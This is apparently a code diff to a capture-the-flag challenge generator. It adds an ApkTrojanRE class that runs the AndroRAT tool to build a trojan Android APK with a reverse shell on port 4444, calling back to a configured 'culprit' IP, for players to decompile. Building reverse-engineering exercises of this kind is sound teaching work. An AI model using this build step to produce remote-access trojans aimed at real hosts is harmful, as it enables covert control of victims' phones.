@@ -2,8 +2,11 @@ from .challenge import GeneratedChallenge
 from .docker_builder import DockerBuilder
 import subprocess
 from os.path import join, dirname, realpath
+import os
 from shutil import make_archive
+import shutil
 from .utils import WorkDir, fwrite, join
+from pathlib import Path
 # from os import join
 
 
@@ -49,6 +52,25 @@ class SimpleJarRE(GeneratedChallenge):
             b.run("mv MyJar.jar chal.jar")
 
         self.chal_file = "chal.jar"
+
+class ApkTrojanRE(GeneratedChallenge):
+    yaml_tag = u'!apk_trojan_re'
+    __doc__ = """
+    Find the flag by decompiling an apk file and finding the culprit's ip address.
+
+    Config:
+
+        cuprit_ip - ip address of the culprit
+    """
+
+    def gen(self, chal_dir):
+        androrat_path = Path("./chal_types/chal_files/AndroRAT-master")
+        with WorkDir(chal_dir):
+            if (androrat_path.exists()):
+                subprocess.call("python3 androRAT.py --build --shell -i culprit:"+self.get_value("culprit_ip")+","+self.flag+" -p 4444 -o trojan.apk", cwd="./chal_types/chal_files/AndroRAT-master")
+                self.chal_file = "trojan.apk"
+            else:
+                print("AndroRAT-master not found. Please clone it from https://github.com/karma9874/AndroRAT.git and place it in the chal_types/chal_files directory. Ensure that the folder with -master in the name is placed in the chal_files directory.")
 
 
 class DocxMalware(GeneratedChallenge):
